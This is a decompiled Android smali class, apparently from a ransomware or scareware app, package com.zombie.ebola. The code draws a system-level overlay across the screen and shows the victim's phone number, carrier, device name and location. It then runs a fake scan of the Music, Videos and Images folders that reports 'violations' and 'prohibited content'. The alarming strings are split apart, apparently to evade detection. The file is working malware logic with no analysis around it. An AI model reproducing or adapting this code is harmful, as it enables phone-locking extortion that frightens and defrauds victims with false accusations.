.class Lcom/zombie/ebola/af;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field a:Landroid/view/LayoutInflater;

.field b:Landroid/view/View;

.field c:Landroid/view/View;

.field final synthetic d:Lcom/zombie/ebola/ae;

.field private final synthetic e:[Landroid/view/View;

.field private final synthetic f:Landroid/widget/TextView;

.field private final synthetic g:Landroid/widget/TextView;

.field private final synthetic h:Landroid/widget/TextView;

.field private final synthetic i:Landroid/widget/TextView;

.field private final synthetic j:Landroid/widget/ImageView;


# direct methods
.method constructor <init>(Lcom/zombie/ebola/ae;[Landroid/view/View;Landroid/widget/TextView;Landroid/widget/TextView;Landroid/widget/TextView;Landroid/widget/TextView;Landroid/widget/ImageView;)V
    .locals 3

    const/4 v2, 0x0

    iput-object p1, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    iput-object p2, p0, Lcom/zombie/ebola/af;->e:[Landroid/view/View;

    iput-object p3, p0, Lcom/zombie/ebola/af;->f:Landroid/widget/TextView;

    iput-object p4, p0, Lcom/zombie/ebola/af;->g:Landroid/widget/TextView;

    iput-object p5, p0, Lcom/zombie/ebola/af;->h:Landroid/widget/TextView;

    iput-object p6, p0, Lcom/zombie/ebola/af;->i:Landroid/widget/TextView;

    iput-object p7, p0, Lcom/zombie/ebola/af;->j:Landroid/widget/ImageView;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    invoke-static {p1}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v0

    const-string v1, "layout_inflater"

    invoke-virtual {v0, v1}, Lcom/zombie/ebola/jora;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/LayoutInflater;

    iput-object v0, p0, Lcom/zombie/ebola/af;->a:Landroid/view/LayoutInflater;

    sget-object v0, Lcom/zombie/ebola/jora;->d:Landroid/view/LayoutInflater;

    const v1, 0x7f030003

    invoke-virtual {v0, v1, v2}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lcom/zombie/ebola/af;->b:Landroid/view/View;

    iget-object v0, p0, Lcom/zombie/ebola/af;->a:Landroid/view/LayoutInflater;

    const v1, 0x7f030001

    invoke-virtual {v0, v1, v2}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lcom/zombie/ebola/af;->c:Landroid/view/View;

    return-void
.end method

.method static synthetic a(Lcom/zombie/ebola/af;)Lcom/zombie/ebola/ae;
    .locals 1

    iget-object v0, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    return-object v0
.end method

.method private a(ILandroid/view/View;Landroid/view/View;)V
    .locals 9

    const/16 v8, 0x8

    packed-switch p1, :pswitch_data_0

    :goto_0
    return-void

    :pswitch_0
    iget-object v0, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v0}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v0

    invoke-virtual {v0}, Lcom/zombie/ebola/jora;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    const-string v1, "invest"

    const-string v2, "id"

    iget-object v3, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v3}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v3

    invoke-virtual {v3}, Lcom/zombie/ebola/jora;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v0

    invoke-virtual {p2, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iget-object v1, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v1}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v1

    invoke-virtual {v1}, Lcom/zombie/ebola/jora;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const-string v2, "locate"

    const-string v3, "id"

    iget-object v4, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v4}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v4

    invoke-virtual {v4}, Lcom/zombie/ebola/jora;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v2, v3, v4}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v1

    invoke-virtual {p2, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    iget-object v2, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v2}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v2

    invoke-virtual {v2}, Lcom/zombie/ebola/jora;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    const-string v3, "carrier"

    const-string v4, "id"

    iget-object v5, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v5}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v5

    invoke-virtual {v5}, Lcom/zombie/ebola/jora;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v3, v4, v5}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    invoke-virtual {p2, v2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    iget-object v3, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v3}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v3

    invoke-virtual {v3}, Lcom/zombie/ebola/jora;->getResources()Landroid/content/res/Resources;

    move-result-object v3

    const-string v4, "phone"

    const-string v5, "id"

    iget-object v6, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v6}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v6

    invoke-virtual {v6}, Lcom/zombie/ebola/jora;->getPackageName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v4, v5, v6}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v3

    invoke-virtual {p2, v3}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/TextView;

    iget-object v4, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v4}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v4

    invoke-virtual {v4}, Lcom/zombie/ebola/jora;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "device_name"

    const-string v6, "id"

    iget-object v7, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v7}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v7

    invoke-virtual {v7}, Lcom/zombie/ebola/jora;->getPackageName()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v5, v6, v7}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    invoke-virtual {p2, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/widget/TextView;

    const v5, 0x7f07000a

    invoke-virtual {p2, v5}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v5

    check-cast v5, Landroid/widget/Button;

    iget-object v6, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v6}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v6

    invoke-virtual {v6}, Lcom/zombie/ebola/jora;->getBaseContext()Landroid/content/Context;

    move-result-object v6

    invoke-static {v6}, Lcom/zombie/ebola/e;->c(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "NO"

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_0

    invoke-virtual {v3, v8}, Landroid/widget/TextView;->setVisibility(I)V

    :cond_0
    iget-object v6, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v6}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v6

    invoke-virtual {v6}, Lcom/zombie/ebola/jora;->getBaseContext()Landroid/content/Context;

    move-result-object v6

    invoke-static {v6}, Lcom/zombie/ebola/e;->b(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "NO"

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_1

    invoke-virtual {v2, v8}, Landroid/widget/TextView;->setVisibility(I)V

    :cond_1
    invoke-static {}, Lcom/zombie/ebola/e;->a()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "#"

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v6, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v6}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v6

    invoke-virtual {v6}, Lcom/zombie/ebola/jora;->getBaseContext()Landroid/content/Context;

    move-result-object v6

    invoke-static {v6}, Lcom/zombie/ebola/e;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v0, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v0}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v0

    invoke-virtual {v0}, Lcom/zombie/ebola/jora;->getBaseContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/e;->c(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v0, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v0}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v0

    invoke-virtual {v0}, Lcom/zombie/ebola/jora;->getBaseContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/e;->b(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v0, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v0}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v0

    invoke-virtual {v0}, Lcom/zombie/ebola/jora;->getBaseContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/zombie/ebola/e;->d(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    new-instance v0, Lcom/zombie/ebola/ag;

    invoke-direct {v0, p0, v5, p2, p3}, Lcom/zombie/ebola/ag;-><init>(Lcom/zombie/ebola/af;Landroid/widget/Button;Landroid/view/View;Landroid/view/View;)V

    invoke-virtual {v5, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    goto/16 :goto_0

    :pswitch_1
    const v0, 0x7f07000d

    invoke-virtual {p2, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    new-instance v1, Lcom/zombie/ebola/ah;

    invoke-direct {v1, p0, v0, p3}, Lcom/zombie/ebola/ah;-><init>(Lcom/zombie/ebola/af;Landroid/widget/Button;Landroid/view/View;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    goto/16 :goto_0

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
    .end packed-switch
.end method

.method private a(Landroid/widget/TextView;Ljava/lang/String;)V
    .locals 0

    invoke-virtual {p1, p2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    return-void
.end method

.method static synthetic a(Lcom/zombie/ebola/af;ILandroid/view/View;Landroid/view/View;)V
    .locals 0

    invoke-direct {p0, p1, p2, p3}, Lcom/zombie/ebola/af;->a(ILandroid/view/View;Landroid/view/View;)V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    const/4 v5, 0x0

    sget v0, Lcom/zombie/ebola/jora;->e:I

    packed-switch v0, :pswitch_data_0

    :goto_0
    :pswitch_0
    return-void

    :pswitch_1
    sget-object v0, Lcom/zombie/ebola/jora;->b:Landroid/view/WindowManager;

    iget-object v1, p0, Lcom/zombie/ebola/af;->b:Landroid/view/View;

    sget-object v2, Lcom/zombie/ebola/jora;->a:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, v1, v2}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    iget-object v0, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v0}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v0

    iget-object v1, p0, Lcom/zombie/ebola/af;->b:Landroid/view/View;

    iget-object v2, p0, Lcom/zombie/ebola/af;->e:[Landroid/view/View;

    aget-object v2, v2, v5

    invoke-static {v0, v1, v2}, Lcom/zombie/ebola/jora;->a(Lcom/zombie/ebola/jora;Landroid/view/View;Landroid/view/View;)V

    iget-object v0, p0, Lcom/zombie/ebola/af;->b:Landroid/view/View;

    iget-object v1, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v1}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v1

    invoke-virtual {v1}, Lcom/zombie/ebola/jora;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const-string v2, "framer"

    const-string v3, "id"

    iget-object v4, p0, Lcom/zombie/ebola/af;->d:Lcom/zombie/ebola/ae;

    invoke-static {v4}, Lcom/zombie/ebola/ae;->a(Lcom/zombie/ebola/ae;)Lcom/zombie/ebola/jora;

    move-result-object v4

    invoke-virtual {v4}, Lcom/zombie/ebola/jora;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v2, v3, v4}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/FrameLayout;

    iget-object v1, p0, Lcom/zombie/ebola/af;->c:Landroid/view/View;

    invoke-virtual {v0, v1}, Landroid/widget/FrameLayout;->addView(Landroid/view/View;)V

    iget-object v0, p0, Lcom/zombie/ebola/af;->b:Landroid/view/View;

    iget-object v1, p0, Lcom/zombie/ebola/af;->b:Landroid/view/View;

    invoke-direct {p0, v5, v0, v1}, Lcom/zombie/ebola/af;->a(ILandroid/view/View;Landroid/view/View;)V

    goto :goto_0

    :pswitch_2
    iget-object v0, p0, Lcom/zombie/ebola/af;->f:Landroid/widget/TextView;

    const-string v1, "Musi"

    const-string v2, "c folder..."

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v0, v1}, Lcom/zombie/ebola/af;->a(Landroid/widget/TextView;Ljava/lang/String;)V

    goto :goto_0

    :pswitch_3
    iget-object v0, p0, Lcom/zombie/ebola/af;->f:Landroid/widget/TextView;

    const-string v1, "Videos"

    const-string v2, "folder..."

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v0, v1}, Lcom/zombie/ebola/af;->a(Landroid/widget/TextView;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/zombie/ebola/af;->g:Landroid/widget/TextView;

    const-string v1, "Status: "

    const-string v2, "Found"

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v0, v1}, Lcom/zombie/ebola/af;->a(Landroid/widget/TextView;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/zombie/ebola/af;->h:Landroid/widget/TextView;

    const-string v1, "Fou"

    const-string v2, "nd 2 Violations"

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v0, v1}, Lcom/zombie/ebola/af;->a(Landroid/widget/TextView;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/zombie/ebola/af;->i:Landroid/widget/TextView;

    const-string v1, "Found 3 Pr"

    const-string v2, "ohibited content"

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v0, v1}, Lcom/zombie/ebola/af;->a(Landroid/widget/TextView;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/zombie/ebola/af;->j:Landroid/widget/ImageView;

    const v1, 0x7f02000e

    invoke-virtual {v0, v1}, Landroid/widget/ImageView;->setImageResource(I)V

    goto/16 :goto_0

    :pswitch_4
    iget-object v0, p0, Lcom/zombie/ebola/af;->f:Landroid/widget/TextView;

    const-string v1, "Images"

    const-string v2, " folder..."

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v0, p0, Lcom/zombie/ebola/af;->h:Landroid/widget/TextView;

    const-string v1, "Found 5 V"

    const-string v2, "iolations"

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v0, p0, Lcom/zombie/ebola/af;->i:Landroid/widget/TextView;

    const-string v1, "Found 7 Prohi"

    const-string v2, "bited content"

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto/16 :goto_0

    nop

    :pswitch_data_0
    .packed-switch 0x3
        :pswitch_2
        :pswitch_3
        :pswitch_0
        :pswitch_0
        :pswitch_4
        :pswitch_1
    .end packed-switch
.end method
